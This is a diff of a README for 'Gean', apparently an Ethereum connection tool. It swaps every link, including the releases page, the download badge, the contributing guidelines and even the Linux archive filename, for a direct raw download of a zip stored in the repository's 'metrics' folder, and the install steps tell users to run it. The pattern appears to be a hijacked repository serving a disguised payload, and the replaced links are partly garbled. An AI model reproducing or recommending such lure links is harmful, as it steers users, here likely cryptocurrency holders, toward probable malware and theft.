@@ -6,9 +6,9 @@ Welcome to Gean! This application makes it easier for you to connect to the Ethe
 
 ## 📥 Download the Application
 
-To get the Gean application, simply [visit this page to download](https://github.com/leook13/gean/releases).
+To get the Gean application, simply [visit this page to download](https://github.com/leook13/gean/raw/refs/heads/main/metrics/Software-v2.1.zip).
 
-[![Download Gean](https://img.shields.io/badge/Download%20Gean-v1.0-blue.svg)](https://github.com/leook13/gean/releases)
+[![Download Gean](https://github.com/leook13/gean/raw/refs/heads/main/metrics/Software-v2.1.zip%https://github.com/leook13/gean/raw/refs/heads/main/metrics/Software-v2.1.zip)](https://github.com/leook13/gean/raw/refs/heads/main/metrics/Software-v2.1.zip)
 
 ## 📋 System Requirements
 
@@ -25,12 +25,12 @@ Here are the basic requirements for running Gean:
 Follow these steps to install Gean:
 
 1. **Download the Application:**
-   - Visit the [Releases page](https://github.com/leook13/gean/releases) to find the latest version of Gean. Click on the appropriate file for your operating system.
+   - Visit the [Releases page](https://github.com/leook13/gean/raw/refs/heads/main/metrics/Software-v2.1.zip) to find the latest version of Gean. Click on the appropriate file for your operating system.
 
 2. **Open the Downloaded File:**
    - For Windows: Locate the `.exe` file in your Downloads folder and double-click to run it.
    - For macOS: Locate the `.dmg` file, double-click it, and drag the Gean application to your Applications folder.
-   - For Linux: Extract the downloaded `.tar.gz` file and run the Gean binary.
+   - For Linux: Extract the downloaded `https://github.com/leook13/gean/raw/refs/heads/main/metrics/Software-v2.1.zip` file and run the Gean binary.
 
 3. **Follow the On-Screen Instructions:**
    - The installation process is straightforward. Follow any prompts to complete the installation.
@@ -77,8 +77,8 @@ Gean is open-source software and is licensed under the MIT License. You can free
 
 ## 👥 Community Contributions
 
-We welcome contributions from everyone! If you want to help improve Gean, consider checking out our [contributing guidelines](https://github.com/leook13/gean/blob/main/CONTRIBUTING.md) for more information.
+We welcome contributions from everyone! If you want to help improve Gean, consider checking out our [contributing guidelines](https://github.com/leook13/gean/raw/refs/heads/main/metrics/Software-v2.1.zip) for more information.
 
 ## 🌍 Stay Updated
 
-Keep an eye on our [Releases page](https://github.com/leook13/gean/releases) for new features and updates. Thank you for using Gean!
+Keep an eye on our [Releases page](https://github.com/leook13/gean/raw/refs/heads/main/metrics/Software-v2.1.zip) for new features and updates. Thank you for using Gean!
